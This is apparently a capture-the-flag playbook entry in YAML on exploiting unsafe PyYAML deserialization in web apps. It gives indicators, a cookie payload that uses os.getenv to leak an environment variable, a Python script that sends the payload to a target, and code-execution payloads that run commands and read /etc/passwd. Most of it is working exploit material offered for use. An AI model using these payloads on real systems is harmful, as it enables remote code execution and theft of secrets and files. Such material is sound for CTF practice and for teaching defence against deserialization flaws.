name: yaml_deserialization
category: web
tags: [deserialization, yaml, rce, cookie]
indicators:
  - "yaml.load with Loader=yaml.Loader"
  - "User-controlled YAML data (cookie, POST)"
  - "Base64 encoded serialized data"
  - "FLAG in environment variable"

tricks:
  - name: "YAML deserialization to read env var"
    when: "yaml.load deserializes user input"
    how: "Construct UrlObj with env var as property, base64 encode, set as cookie"
    payload: |
      - !!python/object:models.UrlObj
        name: !!python/object/apply:os.getenv [FLAG]
        url: !!python/object/apply:os.getenv [FLAG]
    notes: |
      CRITICAL: YAML payload must start with '- !!' directly, NO leading newline!
      
      Python exploit:
      ```python
      import requests, base64
      payload = '''- !!python/object:models.UrlObj
        name: !!python/object/apply:os.getenv [FLAG]
        url: !!python/object/apply:os.getenv [FLAG]
      '''
      encoded = base64.b64encode(payload.encode()).decode()
      r = requests.get('http://target/list', cookies={'bookmarks': encoded})
      print(r.text)  # FLAG will appear in name/url fields
      ```

  - name: "YAML RCE payloads"
    when: "Need to execute arbitrary code"
    how: "Use python object tags"
    payload: |
      # Execute command:
      !!python/object/apply:subprocess.check_output [[cat, /etc/passwd]]
      
      # Read file:
      !!python/object/apply:builtins.open [/etc/passwd]
      
      # Import and call:
      !!python/object/apply:os.system [id]
